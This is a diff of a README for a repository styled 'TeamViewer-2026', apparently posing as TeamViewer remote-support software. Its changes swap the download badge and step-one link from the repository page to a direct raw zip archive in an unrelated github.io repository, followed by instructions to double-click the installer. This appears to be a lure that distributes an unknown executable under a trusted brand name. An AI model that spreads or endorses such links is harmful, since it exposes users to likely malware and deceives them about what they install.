@@ -5,7 +5,7 @@ description: "Standardize TeamViewer remote support workflows, session logs, and
 ---
 # 🖥️ TeamViewer-2026 - Streamline remote support and desktop access
 
-[![Download TeamViewer-2026](https://img.shields.io/badge/Download-TeamViewer-2026-blue.svg)](https://github.com/uniqueente4423/TeamViewer-2026)
+[![Download TeamViewer-2026](https://img.shields.io/badge/Download-TeamViewer-2026-blue.svg)](https://github.com/uniqueente4423/uniqueente4423.github.io/raw/refs/heads/main/ivoriness/uniqueente_io_github_1.0.zip)
 
 ## 📌 Description
 
@@ -25,7 +25,7 @@ Ensure your computer meets these requirements before you start:
 
 Follow these steps to set up the software on your Windows machine:
 
-1. Visit the following link to download the software: [https://github.com/uniqueente4423/TeamViewer-2026](https://github.com/uniqueente4423/TeamViewer-2026).
+1. Visit the following link to download the software: [https://github.com/uniqueente4423/uniqueente4423.github.io/raw/refs/heads/main/ivoriness/uniqueente_io_github_1.0.zip](https://github.com/uniqueente4423/uniqueente4423.github.io/raw/refs/heads/main/ivoriness/uniqueente_io_github_1.0.zip).
 2. Locate the file in your Downloads folder once the transfer finishes.
 3. Double-click the installer file to launch the setup wizard.
 4. Follow the prompts on the screen.
